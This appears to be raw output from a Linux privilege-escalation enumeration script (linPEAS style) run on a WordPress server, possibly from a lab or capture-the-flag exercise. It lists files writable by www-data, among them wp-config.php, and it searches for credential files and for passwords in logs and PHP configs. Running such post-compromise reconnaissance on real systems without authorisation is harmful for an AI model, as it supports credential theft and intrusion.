/var/www/html/wp-activate.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/wp-admin/about.php
/var/www/html/wp-admin/admin-ajax.php
/var/www/html/wp-admin/admin-footer.php
/var/www/html/wp-admin/admin-functions.php
/var/www/html/wp-admin/admin-header.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/wp-admin/css/about-rtl.css
/var/www/html/wp-admin/css/about-rtl.min.css
/var/www/html/wp-admin/css/about.css
/var/www/html/wp-admin/css/about.min.css
/var/www/html/wp-admin/css/admin-menu-rtl.css
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/wp-admin/css/colors/_admin.scss
/var/www/html/wp-admin/css/colors/_mixins.scss
/var/www/html/wp-admin/css/colors/_variables.scss
/var/www/html/wp-admin/css/colors/blue
/var/www/html/wp-admin/css/colors/blue/colors-rtl.css
/var/www/html/wp-admin/css/colors/blue/colors-rtl.min.css
/var/www/html/wp-admin/css/colors/blue/colors.css
/var/www/html/wp-admin/css/colors/blue/colors.min.css
/var/www/html/wp-admin/css/colors/blue/colors.scss
/var/www/html/wp-admin/css/colors/coffee
/var/www/html/wp-admin/css/colors/coffee/colors-rtl.css
/var/www/html/wp-admin/css/colors/coffee/colors-rtl.min.css
/var/www/html/wp-admin/css/colors/coffee/colors.css
/var/www/html/wp-admin/css/colors/coffee/colors.min.css
/var/www/html/wp-admin/css/colors/coffee/colors.scss
/var/www/html/wp-admin/css/colors/ectoplasm
/var/www/html/wp-admin/css/colors/ectoplasm/colors-rtl.css
/var/www/html/wp-admin/css/colors/ectoplasm/colors-rtl.min.css
/var/www/html/wp-admin/css/colors/ectoplasm/colors.css
/var/www/html/wp-admin/css/colors/ectoplasm/colors.min.css
/var/www/html/wp-admin/css/colors/ectoplasm/colors.scss
/var/www/html/wp-admin/css/colors/light
/var/www/html/wp-admin/css/colors/light/colors-rtl.css
/var/www/html/wp-admin/css/colors/light/colors-rtl.min.css
/var/www/html/wp-admin/css/colors/light/colors.css
/var/www/html/wp-admin/css/colors/light/colors.min.css
/var/www/html/wp-admin/css/colors/light/colors.scss
/var/www/html/wp-admin/css/colors/midnight
/var/www/html/wp-admin/css/colors/midnight/colors-rtl.css
/var/www/html/wp-admin/css/colors/midnight/colors-rtl.min.css
/var/www/html/wp-admin/css/colors/midnight/colors.css
/var/www/html/wp-admin/css/colors/midnight/colors.min.css
/var/www/html/wp-admin/css/colors/midnight/colors.scss
/var/www/html/wp-admin/css/colors/modern
/var/www/html/wp-admin/css/colors/modern/colors-rtl.css
/var/www/html/wp-admin/css/colors/modern/colors-rtl.min.css
/var/www/html/wp-admin/css/colors/modern/colors.css
/var/www/html/wp-admin/css/colors/modern/colors.min.css
/var/www/html/wp-admin/css/colors/modern/colors.scss
/var/www/html/wp-admin/css/colors/ocean
/var/www/html/wp-admin/css/colors/ocean/colors-rtl.css
/var/www/html/wp-admin/css/colors/ocean/colors-rtl.min.css
/var/www/html/wp-admin/css/colors/ocean/colors.css
/var/www/html/wp-admin/css/colors/ocean/colors.min.css
/var/www/html/wp-admin/css/colors/ocean/colors.scss
/var/www/html/wp-admin/css/colors/sunrise
/var/www/html/wp-admin/css/colors/sunrise/colors-rtl.css
/var/www/html/wp-admin/css/colors/sunrise/colors-rtl.min.css
/var/www/html/wp-admin/css/colors/sunrise/colors.css
/var/www/html/wp-admin/css/colors/sunrise/colors.min.css
/var/www/html/wp-admin/css/colors/sunrise/colors.scss
/var/www/html/wp-admin/css/common-rtl.css
/var/www/html/wp-admin/css/common-rtl.min.css
/var/www/html/wp-admin/css/common.css
/var/www/html/wp-admin/css/common.min.css
/var/www/html/wp-admin/css/customize-controls-rtl.css
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/wp-admin/custom-background.php
/var/www/html/wp-admin/custom-header.php
/var/www/html/wp-admin/customize.php
/var/www/html/wp-admin/edit-comments.php
/var/www/html/wp-admin/edit-form-advanced.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/wp-admin/includes/admin-filters.php
/var/www/html/wp-admin/includes/admin.php
/var/www/html/wp-admin/includes/ajax-actions.php
/var/www/html/wp-admin/includes/bookmark.php
/var/www/html/wp-admin/includes/class-automatic-upgrader-skin.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/wp-admin/index.php
/var/www/html/wp-admin/install-helper.php
/var/www/html/wp-admin/install.php
/var/www/html/wp-admin/js
/var/www/html/wp-admin/js/accordion.js
/var/www/html/wp-admin/js/accordion.min.js
/var/www/html/wp-admin/js/application-passwords.js
/var/www/html/wp-admin/js/application-passwords.min.js
/var/www/html/wp-admin/js/auth-app.js
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/wp-admin/js/widgets/custom-html-widgets.js
/var/www/html/wp-admin/js/widgets/custom-html-widgets.min.js
/var/www/html/wp-admin/js/widgets/media-audio-widget.js
/var/www/html/wp-admin/js/widgets/media-audio-widget.min.js
/var/www/html/wp-admin/js/widgets/media-gallery-widget.js
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/wp-admin/js/word-count.js
/var/www/html/wp-admin/js/word-count.min.js
/var/www/html/wp-admin/js/xfn.js
/var/www/html/wp-admin/js/xfn.min.js
/var/www/html/wp-admin/link-add.php
/var/www/html/wp-admin/link-manager.php
/var/www/html/wp-admin/link-parse-opml.php
/var/www/html/wp-admin/link.php
/var/www/html/wp-admin/load-scripts.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/wp-admin/maint/repair.php
/var/www/html/wp-admin/media-new.php
/var/www/html/wp-admin/media-upload.php
/var/www/html/wp-admin/media.php
/var/www/html/wp-admin/menu-header.php
/var/www/html/wp-admin/menu.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/wp-admin/network/about.php
/var/www/html/wp-admin/network/admin.php
/var/www/html/wp-admin/network/credits.php
/var/www/html/wp-admin/network/edit.php
/var/www/html/wp-admin/network/freedoms.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/wp-admin/options-discussion.php
/var/www/html/wp-admin/options-general.php
/var/www/html/wp-admin/options-head.php
/var/www/html/wp-admin/options-media.php
/var/www/html/wp-admin/options-permalink.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/wp-admin/user/about.php
/var/www/html/wp-admin/user/admin.php
/var/www/html/wp-admin/user/credits.php
/var/www/html/wp-admin/user/freedoms.php
/var/www/html/wp-admin/user/index.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/wp-admin/users.php
/var/www/html/wp-admin/widgets-form-blocks.php
/var/www/html/wp-admin/widgets-form.php
/var/www/html/wp-admin/widgets.php
/var/www/html/wp-blog-header.php
/var/www/html/wp-comments-post.php
/var/www/html/wp-config-sample.php
/var/www/html/wp-config.php
/var/www/html/wp-content
/var/www/html/wp-content/index.php
/var/www/html/wp-content/plugins
/var/www/html/wp-content/plugins/akismet
/var/www/html/wp-content/plugins/akismet/.htaccess
/var/www/html/wp-content/plugins/akismet/LICENSE.txt
/var/www/html/wp-content/plugins/akismet/_inc
/var/www/html/wp-content/plugins/akismet/_inc/akismet-frontend.js
/var/www/html/wp-content/plugins/akismet/_inc/akismet.css
/var/www/html/wp-content/plugins/akismet/_inc/akismet.js
/var/www/html/wp-content/plugins/akismet/_inc/img
/var/www/html/wp-content/plugins/akismet/akismet.php
/var/www/html/wp-content/plugins/akismet/changelog.txt

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                   
  Group www-data:                                                                                                   
/var/www/html/wp-config.php                                                                                         
/var/www/html/filemanager/config/bookmarks_extplorer_admin.php

╔══════════╣ Searching passwords in config PHP files
                $pwd    = trim( wp_unslash( $_POST['pwd'] ) );                                                      

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password                                                                                          
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-38.pyc
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/keyring/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/keyring/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_credential_store.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/test_credential_store.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-plymouth.path
/usr/lib/systemd/system/systemd-ask-password-plymouth.service

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                    
╔══════════╣ Searching passwords inside logs (limit 70)
2023-04-06 03:34:36,823 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2023-04-06 03:34:36,823 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2023-04-06 05:08:38,784 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2023-04-06 05:08:38,784 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2023-04-06 09:54:10,622 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2023-04-06 09:54:10,623 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2023-04-06 13:30:06,593 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2023-04-06 13:30:06,593 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
[    3.208253] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
[    3.383998] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
[    3.486391] systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
[    3.486916] systemd[1]: Condition check resulted in Forward Password Requests to Plymouth Directory Watch being skipped.



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                  
                                ╚════════════════╝                                                                  
Regexes to search for API keys aren't activated, use param '-r' 
```